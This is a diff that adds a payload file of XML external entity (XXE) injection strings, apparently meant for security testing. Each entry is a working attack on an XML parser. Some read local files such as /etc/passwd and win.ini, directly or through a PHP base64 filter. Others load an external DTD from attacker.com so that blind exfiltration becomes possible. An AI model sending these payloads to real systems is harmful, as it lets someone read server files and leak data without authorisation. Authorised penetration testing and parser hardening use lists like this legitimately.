@@ -1,0 +1,30 @@
+# XXE Payloads
+# Basic XXE payload
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# External DTD XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
+<root>&xxe;</root>
+
+# Blind XXE with external DTD
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
+<root></root>
+
+# Parameter entity XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
+<root></root>
+
+# Windows file XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
+<root>&xxe;</root>
+
+# PHP wrapper XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<root>&xxe;</root>
